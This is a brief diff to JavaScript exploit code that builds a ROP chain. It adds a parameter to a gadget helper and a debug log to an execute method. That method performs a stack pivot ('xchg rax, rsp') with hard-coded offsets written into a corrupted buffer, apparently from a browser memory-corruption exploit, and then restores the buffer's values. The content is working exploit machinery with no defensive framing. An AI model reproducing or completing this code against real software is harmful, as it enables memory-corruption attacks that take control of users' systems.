@@ -25,7 +25,7 @@ function Storage() {
     }
 }
 
-function gadget(module, offset) {
+function gadget(module, offset, machine) {
     this.addr = function() {
         return this.get_module_base().add(offset);
     }
@@ -77,6 +77,7 @@ function RopChain() {
 
 
     this.execute = function() {
+        debug_log("execute");
         // xchg rax, rsp; dec dword ptr [rax - 0x77]; ret;
         rop_buf[2] = cbuf[0x10] - ((0x60000 * 4) * 17) + 0xdcac1
         rop_buf[3] = cbuf[0x11]
@@ -107,7 +108,6 @@ function RopChain() {
         rop_buf.byteLength;
         cbuf[0x10] = old_low
         cbuf[0x11] = old_high
-
     }
 
     // Code to cleanup the modification done by by the stack pivot
